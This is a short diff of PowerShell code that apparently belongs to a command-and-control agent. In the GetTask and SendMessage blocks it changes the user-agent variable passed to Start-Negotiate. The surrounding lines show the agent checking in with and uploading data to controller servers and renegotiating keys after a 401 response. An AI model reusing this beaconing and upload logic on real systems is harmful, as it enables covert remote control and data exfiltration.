@@ -28,7 +28,7 @@ $Script:GetTask = {
     } catch [Net.WebException] {
         $Script:missedCheckins += 1;
         if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-            Start-Negotiate -S "$Script:mhost" -SK $SK -UA $ua;
+            Start-Negotiate -S "$Script:mhost" -SK $SK -UA $aua;
         }
     }
 };
@@ -54,7 +54,7 @@ $Script:SendMessage = {
                 $response = $client.UploadData($Script:servers[$Script:index] + $uri, 'POST', $packet);
             } catch [System.Net.WebException] {
                 if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-                    Start-Negotiate -S "$Script:mhost" -SK $SK -UA $ua;
+                    Start-Negotiate -S "$Script:mhost" -SK $SK -UA $aua;
                 }
             }
         }
